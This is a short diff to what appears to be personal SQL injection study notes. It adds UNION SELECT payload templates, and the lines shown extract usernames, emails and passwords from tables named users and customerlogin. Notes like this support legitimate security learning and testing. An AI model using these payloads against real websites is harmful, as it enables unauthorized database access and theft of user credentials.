@@ -108,8 +108,10 @@ Get Columns When Table Name is Known
 Get Data from Columns MORE NOTES NEEDED 
 ---------------------
 ```sql
-ADD CONCAT technique!!!!!!!!!!!!!!!!!!!
+
 INJECTION MUST RESPECT THE NUMBER OF COLUMNS. USE NULL IF REQUIRED.
+'+UNION+SELECT+<columnname>,<columnname>+FROM+<tablename>--%20
+'+UNION+SELECT+user,password+FROM+users--%20
 
 '+UNION+SELECT+NULL,email,+password+FROM+customerlogin#
 '+UNION+SELECT+answer,email,+password+FROM+customerlogin#
